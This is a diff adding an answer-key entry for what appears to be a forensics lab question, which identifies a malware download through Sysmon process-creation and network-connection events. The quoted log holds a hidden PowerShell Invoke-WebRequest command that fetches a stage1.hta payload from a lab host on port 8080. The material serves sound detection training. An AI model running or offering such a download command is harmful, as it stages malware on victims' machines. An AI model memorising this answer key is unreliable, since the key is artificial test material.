@@ -1,0 +1,9 @@
+Q2. Which PowerShell cmdlet retrieves the malware, and on what port?
+========================================================================
+Method: Event ID 1 (CommandLine) + Event ID 3 (DestinationPort)
+Answer: Cmdlet: invoke-webrequest    Port: 8080  (HTTP alternate - common malware staging server)
+
+SUPPORTING EVENTS
+------------------------------------------------------------------------
+download command -> [EID 1 Process creation] | 2023-08-14 09:12:40.222 | Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | CommandLine=powershell.exe -nop -w hidden -c Invoke-WebRequest -Uri http://192.168.56.104:8080/stage1.hta -OutFile C:\Users\jdoe\AppData\Local\Temp\stage1.hta
+connection by the same process -> [EID 3 Network connection] | 2023-08-14 09:12:41.010 | Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | DestinationPort=8080
